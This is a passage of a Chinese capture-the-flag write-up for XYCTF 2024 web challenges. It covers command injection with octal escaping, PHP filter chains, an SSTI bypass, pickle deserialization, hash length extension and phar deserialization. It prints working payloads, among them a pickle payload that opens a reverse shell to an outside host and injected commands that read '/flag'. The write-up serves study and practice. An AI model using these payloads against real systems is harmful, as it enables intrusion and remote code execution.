+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python3 -m http.server 9999
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后启的服务器默认是在root目录下的，所以马要下在root目录下</p>
+<p>最后就是读取了</p>
+<p><img src="/p/xyctf2024/image-20250905222055780.png"
+	width="1340"
+	height="1173"
+	srcset="/p/xyctf2024/image-20250905222055780_hu7628902281760560592.png 480w, /p/xyctf2024/image-20250905222055780_hu18217279405022938294.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250905222055780"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="114"
+		data-flex-basis="274px"
+	
+></p>
+<p>另外，这道题目还可以用<code>cp /flag em</code>加八进制绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?cmd=%0d`$_GET[c]`;%23&amp;c=$&#39;\143\160&#39;+$&#39;\57\146\154\141\147&#39;+$&#39;\145\155&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="连连看httpssocsdnnetsosearchq连连看spm1001210130017020到底是连连什么看"><a class="link" href="https://so.csdn.net/so/search?q=%e8%bf%9e%e8%bf%9e%e7%9c%8b&amp;spm=1001.2101.3001.7020"  target="_blank" rel="noopener"
+    >连连看</a>到底是连连什么看
+</h2><h3 id="知识点php_filter_chainstringstrip_tags过滤php">知识点：php_filter_chain、string.strip_tags过滤php
+</h3><p>一开始是个连连看，然后源代码发现文件包含，随便包一个，发现提示去<code>what's_this.php</code></p>
+<p><img src="/p/xyctf2024/image-20250905223449785.png"
+	width="779"
+	height="520"
+	srcset="/p/xyctf2024/image-20250905223449785_hu14852634051737142054.png 480w, /p/xyctf2024/image-20250905223449785_hu6161669535415327678.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250905223449785"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="149"
+		data-flex-basis="359px"
+	
+></p>
+<p>和ezLFI挺像的，是php_fileter_chain，</p>
+<p>用脚本<a class="link" href="https://github.com/synacktiv/php_filter_chain_generator"  target="_blank" rel="noopener"
+    >Issues · synacktiv/php_filter_chain_generator</a></p>
+<p>生成一个&quot;XYCTF&lt;?php&quot;，这样就可以把payload的值改为XYCTF（直接写XYCTF的话会有脏数据）</p>
+<p><img src="/p/xyctf2024/image-20250906152455350.png"
+	width="1723"
+	height="626"
+	srcset="/p/xyctf2024/image-20250906152455350_hu8796381186661454691.png 480w, /p/xyctf2024/image-20250906152455350_hu13242671511960994060.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250906152455350"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="275"
+		data-flex-basis="660px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是php是需要过滤的（指的是我们生成的&quot;XYCTF&lt;?php&quot;），我们手动加string.strip_tags过滤器来去除php标签</p>
+<p>最终paylod</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|string.strip_tags
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/xyctf2024/image-20250906153525603.png"
+	width="1318"
+	height="521"
+	srcset="/p/xyctf2024/image-20250906153525603_hu6009246460203055762.png 480w, /p/xyctf2024/image-20250906153525603_hu17228424555983368299.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250906153525603"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="252"
+		data-flex-basis="607px"
+	
+></p>
+<h2 id="我是一个复读机">我是一个复读机
+</h2><h3 id="知识点脑洞sstirequestattr绕过">知识点：脑洞ssti、request+attr绕过
+</h3><p>爆破，密码是asdqwe</p>
+<p>复读机一般都是ssti，然后ban了{{}}、{%%}</p>
+<p>这里是可以用emoji表情代替{{}}，这倒是可以防止fenjing一把锁了</p>
+<p>然后就是普通的ssti，这里用request+ attr绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?sentence=😡lipsum|attr(request.args.glo)|attr(request.args.ge)(request.args.o)|attr(request.args.po)(request.args.cmd)|attr(request.args.re)()😡&amp;glo=__globals__&amp;ge=__getitem__&amp;o=os&amp;po=popen&amp;cmd=cat /flag&amp;re=read
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="login">login
+</h2><h3 id="知识点pickle反序列化o指令码绕过">知识点：pickle反序列化o指令码绕过
+</h3><p>登录后，抓包提交发现有waf</p>
+<p><img src="/p/xyctf2024/image-20250907114139873.png"
+	width="1590"
+	height="616"
+	srcset="/p/xyctf2024/image-20250907114139873_hu12966247631033758075.png 480w, /p/xyctf2024/image-20250907114139873_hu17849293697641709738.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250907114139873"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="258"
+		data-flex-basis="619px"
+	
+></p>
+<p>注意到有类似base64码的东西，解码出来乱七八糟，还有app啥的，感觉是pickle反序列化，然后这里又有waf，那就试试用o指令集绕过吧</p>
+<p><img src="/p/xyctf2024/image-20250907114311560.png"
+	width="1393"
+	height="188"
+	srcset="/p/xyctf2024/image-20250907114311560_hu6453289917415822669.png 480w, /p/xyctf2024/image-20250907114311560_hu9848840575949466554.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250907114311560"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="740"
+		data-flex-basis="1778px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">shell</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/6.tcp.cpolar.top/12932 0&lt;&amp;1&#34;&#39;&#39;&#39;</span>  <span class="c1"># 反弹shell语句</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">shell</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/6.tcp.cpolar.top/12932 0&lt;&amp;1&#34;&#39;&#39;&#39;</span> 
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;&#39;(ctimeit
+</span></span></span><span class="line"><span class="cl"><span class="s1">timeit
+</span></span></span><span class="line"><span class="cl"><span class="s1">(cos
+</span></span></span><span class="line"><span class="cl"><span class="s1">system
+</span></span></span><span class="line"><span class="cl"><span class="s1">V&#39;&#39;&#39;</span> <span class="o">+</span> <span class="n">shell</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">oo.&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>尴尬的是，因为ban了r指令，内网穿透的域名就有r，所有还是得用vps弹</p>
+<p><img src="/p/xyctf2024/image-20250907155552713.png"
+	width="1067"
+	height="900"
+	srcset="/p/xyctf2024/image-20250907155552713_hu677572590754174922.png 480w, /p/xyctf2024/image-20250907155552713_hu11499683290560488155.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250907155552713"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="118"
+		data-flex-basis="284px"
+	
+></p>
+<h2 id="give-me-flag">give me flag
+</h2><h3 id="知识点哈希长度拓展攻击">知识点：哈希长度拓展攻击
+</h3><p><img src="/p/xyctf2024/image-20250907155840636.png"
+	width="782"
+	height="575"
+	srcset="/p/xyctf2024/image-20250907155840636_hu11027302654457843487.png 480w, /p/xyctf2024/image-20250907155840636_hu514165466535619098.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250907155840636"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="136"
+		data-flex-basis="326px"
+	
+></p>
+<p>之前在basectf中遇到过这种哈希长度拓展攻击，好像还稍微解释了一下。</p>
+<p>这里贴一个文章好了，就不深究了</p>
+<p><a class="link" href="https://www.cnblogs.com/yunen/p/13624595.html"  target="_blank" rel="noopener"
+    >浅谈HASH长度拓展攻击 - Yunen的博客 - 博客园</a></p>
+<p>然后本来是有长度拓展攻击的脚本，但是这里还加上了时间戳，所以就需要一个新的脚本加上时间戳来解决这道题</p>
+<p>这里用的别的师傅的脚本，这里还需要<a class="link" href="https://github.com/shellfeel/hash-ext-attack"  target="_blank" rel="noopener"
+    >GitHub - shellfeel/hash-ext-attack: 哈希长度扩展攻击利用脚本，免去了hashpump需要编译的烦恼</a>common文件夹中的内容，改一下hash_ext_attack.py就行。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">common.HashExtAttack</span> <span class="kn">import</span> <span class="n">HashExtAttack</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">loguru</span> <span class="kn">import</span> <span class="n">logger</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">logger</span><span class="o">.</span><span class="n">remove</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">logger</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s2">&#34;INFO&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="mi">50</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">value</span> <span class="o">=</span> <span class="s2">&#34;2&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">times</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span> <span class="o">+</span> <span class="mi">4</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://127.0.0.1:9342/&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">crack</span> <span class="o">=</span> <span class="n">HashExtAttack</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">va</span><span class="p">,</span><span class="n">md5</span> <span class="o">=</span> <span class="n">crack</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;1941fdd8711dda8426747b1bb9f18bff&#34;</span><span class="p">,</span><span class="n">value</span> <span class="o">+</span> <span class="n">times</span><span class="p">,</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;?value=</span><span class="si">{</span><span class="n">va</span><span class="p">[:</span><span class="nb">len</span><span class="p">(</span><span class="n">va</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">times</span><span class="p">)</span> <span class="p">]</span><span class="si">}</span><span class="s2">&amp;md5=</span><span class="si">{</span><span class="n">md5</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="n">data</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">now_time</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">        <span class="n">flag</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="n">a</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="s2">&#34;XYCTF&#34;</span> <span class="ow">in</span> <span class="n">a</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">elif</span> <span class="n">flag</span> <span class="o">&lt;</span> <span class="mi">5</span> <span class="ow">and</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span> <span class="o">!=</span> <span class="n">now_time</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">temp</span> <span class="o">=</span> <span class="n">a</span><span class="o">.</span><span class="n">text</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">now_time</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">                        <span class="c1"># print(temp.split(&#34;?&gt;&#34;)[1],times,now_time,i)</span>
+</span></span><span class="line"><span class="cl">                        <span class="nb">print</span><span class="p">(</span><span class="n">times</span><span class="p">,</span><span class="n">now_time</span><span class="p">,</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">flag</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">                <span class="n">now_time</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">now_time</span> <span class="o">&gt;</span> <span class="nb">int</span><span class="p">(</span><span class="n">times</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">break</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后这里肯定是还要爆破的，爆破flag的长度，要一点点试。</p>
+<p>跑半天，跑不出来，反正就这么个事，就不多说了</p>
+<h2 id="pharme">pharme
+</h2><h3 id="知识点__halt_compiler终止编译evalendgetallheaders绕过无参数rcephar反序列化phpfilter绕过phar">知识点：__halt_compiler()终止编译、eval(end(getallheaders()));绕过无参数rce、phar反序列化、php:filter绕过phar
+</h3><p>开局一个文件上传，说是phar那肯定就是phar了，传了个图片马，没被ban，但是路径进不去。</p>
+<p>源代码里看到class.php</p>
+<p><img src="/p/xyctf2024/image-20250907203212940.png"
+	width="1729"
+	height="767"
+	srcset="/p/xyctf2024/image-20250907203212940_hu16249848078669040841.png 480w, /p/xyctf2024/image-20250907203212940_hu12174360231540776381.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250907203212940"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="225"
+		data-flex-basis="541px"
+	
+></p>
+<p>简单看一下绕过函数，首先会去除cmd中所有的字母、下划线和括号，然后再把连续分号替换成<code>ch3nxl</code>，然后再与ch3nxl作比较，为真就进行eval</p>
+<p><code>其实就是判断你的cmd中是否只有字母、下划线和括号。</code></p>
+<p>所以是无数字rce，这里可以用<code>eval(end(getallheaders()));</code>获取所有http头，然后返回最后一个http头给eval函数（好思路啊）</p>
+<p>不用这个的话，无参rce之前也做过</p>
+<p>然后难点其实在eval函数那里的绕过，因为eval中间的内容是字符串拼接的，所以我们并不能直接通过<code>#</code>和<code>//</code>进行注释，需要用到<code>__halt_compiler()</code>来终止编译</p>
+<p>所以构造payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">evil</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$cmd</span><span class="o">=</span><span class="s2">&#34;eval(end(getallheaders()));__halt_compiler();&#34;</span><span class="p">;</span>   <span class="c1">//写shell
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="s1">&#39;poc.phar&#39;</span><span class="p">);</span>   <span class="c1">//删除之前的test.phar文件(如果有)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">=</span><span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s1">&#39;poc.phar&#39;</span><span class="p">);</span>  <span class="c1">//创建一个phar对象，文件名必须以phar为后缀
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>  <span class="c1">//开始写文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s1">&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;</span><span class="p">);</span>  <span class="c1">//写入stub
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$o</span><span class="o">=</span><span class="k">new</span> <span class="nx">evil</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span><span class="c1">//写入meta-data
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span><span class="s2">&#34;test&#34;</span><span class="p">);</span>  <span class="c1">//添加要压缩的文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/xyctf2024/image-20250908142258074.png"
+	width="547"
+	height="268"
+	srcset="/p/xyctf2024/image-20250908142258074_hu5462717126945984394.png 480w, /p/xyctf2024/image-20250908142258074_hu1274810513776483929.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250908142258074"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="204"
+		data-flex-basis="489px"
+	
+></p>
+<p>也可以用python进行gzip压缩</p>
+<p>然后改个后缀名绕过文件名的waf</p>
+<p>然后再class.php传</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php://filter/convert.base64-encode/resource=phar:///tmp/23f1a0f70f076b42b5b49f24ee28f696.png
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最后rce</p>
+<p><img src="/p/xyctf2024/image-20250908143044664.png"
+	width="1928"
+	height="964"
+	srcset="/p/xyctf2024/image-20250908143044664_hu16629624621651965302.png 480w, /p/xyctf2024/image-20250908143044664_hu2527273687591000652.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250908143044664"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="200"
+		data-flex-basis="480px"
+	
+></p>
+<h2 id="ezmake">ezMake
+</h2><h3 id="知识点makefile">知识点：Makefile
+</h3><p>这玩意还真没学过</p>
+<p>简单看看这是个啥</p>
+<p><code>Makefile</code> 文件描述了 <code>Linux</code> 系统下 <code>C/C++</code> 工程的编译规则，它用来自动化编译 <code>C/C++</code> 项目。一旦写编写好 <code>Makefile</code> 文件，只需要一个 <code>make</code> 命令，整个工程就开始自动编译，不再需要手动执行 <code>GCC</code> 命令。</p>
+<p>在Makefile中，你可以使用<code>$(shell)</code>函数来读取文件内容。</p>
+<p>例：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-makefile" data-lang="makefile"><span class="line"><span class="cl"><span class="nv">content</span> <span class="o">:=</span> <span class="k">$(</span>shell cat file.txt<span class="k">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">上述命令将文件file.txt的内容存储在变量content中。你可以根据需要将其用于后续的操作。</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后题目也就是这样做</p>
+<p><img src="/p/xyctf2024/image-20250908153452694.png"
+	width="1324"
+	height="683"
